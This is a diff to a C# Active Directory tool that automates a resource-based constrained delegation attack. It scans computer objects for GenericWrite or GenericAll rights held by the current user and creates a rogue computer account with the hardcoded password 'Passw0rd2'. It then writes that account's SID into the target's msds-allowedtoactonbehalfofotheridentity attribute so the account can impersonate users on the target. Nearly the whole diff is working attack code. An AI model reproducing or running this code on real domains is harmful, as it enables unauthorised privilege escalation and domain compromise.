@@ -31,6 +31,23 @@ namespace ADautoenum
             SidTypeLogonSession
         }
 
+
+        public static string GetRandomName()
+        {
+            string res = "";
+            var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+            var random = new Random();
+
+            char[] old = new char[10];
+
+            for(int i = 0; i < 10; i++)
+            {
+                old[i] = chars[random.Next(10)];
+            }
+            res = new String(old);
+            return res;
+        }
+
         public delegate string runall(string name);
         public static string GetKerberoastable(string domainname)
         {
@@ -501,66 +518,53 @@ namespace ADautoenum
                         }
 
 
-                    ds.Filter = "(objectclass=user)";
-                    
+                    ds.Filter = "(objectclass=computer)";
+
+                    string currentusername = WindowsIdentity.GetCurrent().Name;
+                    // TECH69\test2
+                    currentusername = currentusername.Split('\\')[1];
                     foreach(SearchResult sr2 in ds.FindAll())
                     {
-                        try
+
+
+                       DirectoryEntry temp =  sr2.GetDirectoryEntry();
+
+                      ActiveDirectorySecurity ads=  temp.ObjectSecurity;
+
+                       AuthorizationRuleCollection arc = ads.GetAccessRules(true, true, typeof(NTAccount));
+
+                        foreach(ActiveDirectoryAccessRule ar in arc)
                         {
-                            //sw.WriteLine(sr2.Path);
-                            if (sr2.Properties["samaccountname"][0].ToString().Contains("WIN2016"))
+                            if (ar.IdentityReference.ToString().ToLower().Contains(currentusername.ToLower()))
                             {
-                                
-                               
-                                DirectoryEntry temp = sr2.GetDirectoryEntry();
 
-                                temp.Properties["msds-allowedtoactonbehalfofotheridentity"].Clear();
-                                temp.CommitChanges();
-
-                                ActiveDirectorySecurity ads=  temp.ObjectSecurity;
-                                AuthorizationRuleCollection arc= ads.GetAccessRules(true,true,typeof(NTAccount));
-                                foreach(ActiveDirectoryAccessRule ar in arc)
+                                if (ar.ActiveDirectoryRights.ToString().ToLower().Contains("genericwrite") || ar.ActiveDirectoryRights.ToString().ToLower().Contains("genericall"))
                                 {
-                                    
-                                    if (ar.ActiveDirectoryRights.ToString().ToLower().Contains("genericwrite") || ar.ActiveDirectoryRights.ToString().ToLower().Contains("genericall"))
-                                    //if(ar.IdentityReference.ToString().Contains("test2"))
-                                    {
 
-                                        sw.WriteLine("{0} has GenericWrite on {1}", ar.IdentityReference, sr2.Properties["samaccountname"][0]);
+                                    sw.WriteLine(sr2.Path);
+                                    sw.WriteLine(ar.ActiveDirectoryRights);
+                                    sw.WriteLine(ar.AccessControlType);
+                                    sw.WriteLine(ar.InheritanceFlags);
 
+                                    string newsid = CreateNewComputer("d", GetRandomName());
 
-                                        sw.WriteLine(ar.AccessControlType);
-                                        sw.WriteLine(ar.IdentityReference);
-                                        sw.WriteLine(ar.InheritanceType);
-                                        sw.WriteLine(ar.ObjectFlags);
-                                        sw.WriteLine(ar.PropagationFlags);
-                                        sw.WriteLine(ar.InheritedObjectType);
-                                        sw.WriteLine(ar.ActiveDirectoryRights);
-
-                                        sw.WriteLine();
-                                    }
-                                }
-
-
-                                string newsid = CreateNewComputer("s", "pwnedbox");
-                                //string newsid = @"S-1-5-21-2846196120-3918715802-2505943323-1615";
-                                if (newsid != null)
-                                {
-                                    sw.WriteLine("Setting  msds-allowedtoactonbehalfofotheridentity attribute");
-                                    sw.WriteLine(newsid);
                                     string sddl = @"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;" + newsid + ")";
+
                                     RawSecurityDescriptor rs = new RawSecurityDescriptor(sddl);
-                                    byte[] rawsd = new byte[sddl.Length];
-                                    rs.GetBinaryForm(rawsd, 0);
-                                    sw.WriteLine(rs.GetSddlForm(AccessControlSections.All));
-                                    temp.Properties["msds-allowedtoactonbehalfofotheridentity"].Value = rawsd;
+
+                                    byte[] bytesid = new byte[sddl.Length];
+                                    rs.GetBinaryForm(bytesid, 0);
+
+                                    temp.Properties["msds-allowedtoactonbehalfofotheridentity"].Value = bytesid;
                                     temp.CommitChanges();
-                                    sw.WriteLine("Set");
+
+                                    sw.WriteLine("Set SID: {0} to {1}", newsid, temp.Path);
+
                                 }
 
                             }
                         }
-                        catch { }
+
                     }
 
                     }
@@ -585,39 +589,43 @@ namespace ADautoenum
         public static string CreateNewComputer(string domainname,string machinename)
         {
             string res = "";
-            try
-            {
+
+            try {
+
                 DirectoryEntry de = new DirectoryEntry("LDAP://CN=Computers,DC=tech69,DC=local");
 
                 DirectoryEntry computerobj = de.Children.Add("CN="+machinename, "computer");
 
-                Console.WriteLine("Creating fake computer account");
-                string password = "Passw0rd2"; 
-
-                computerobj.Properties["samaccountname"].Value = machinename.ToUpper()+"$";
-                computerobj.Properties["useraccountcontrol"].Value = 0x1000;// 0x1020;
+                computerobj.Properties["useraccountcontrol"].Value = 0x1000;
+                computerobj.Properties["samaccountname"].Value = machinename + "$";
                 computerobj.CommitChanges();
 
+                string password = "Passw0rd2";
                 computerobj.Invoke("SetPassword", password);
                 computerobj.CommitChanges();
 
-                byte[] machinesid = (byte[]) computerobj.Properties["objectsid"][0];
-
-                var sid = new SecurityIdentifier(machinesid, 0);
-                
-                Console.WriteLine("Computer Account {0} created successfully",computerobj.Properties["samaccountname"][0]);
+                Console.WriteLine("Created computer account: {0}",machinename+"$");
                 Console.WriteLine("Password: {0}",password);
-                Console.WriteLine("{0} SID: {1}", computerobj.Properties["samaccountname"][0],sid.ToString());
-                res += sid.ToString();
-                return res;
-            
+
+                byte[] sid= (byte[])  computerobj.Properties["objectsid"][0];
+
+                var si = new SecurityIdentifier(sid, 0);
+                
+                Console.WriteLine("SID: {0}",si.ToString());
+
+                res = si.ToString();
+
             }
+
+
             catch(Exception e)
             {
-                res += e.Message;
+                res = e.Message;
             }
 
             return res;
+
+
         }
 
         #region winapi
@@ -697,7 +705,7 @@ namespace ADautoenum
             r += GetDescription;
             r += GetUnconstrainedDelegation;
             r += GetConstrainedDelegation;
-            r += GetResourceDelegation;
+            //r += GetResourceDelegation;
 
             
             Delegate[] d2 = r.GetInvocationList();
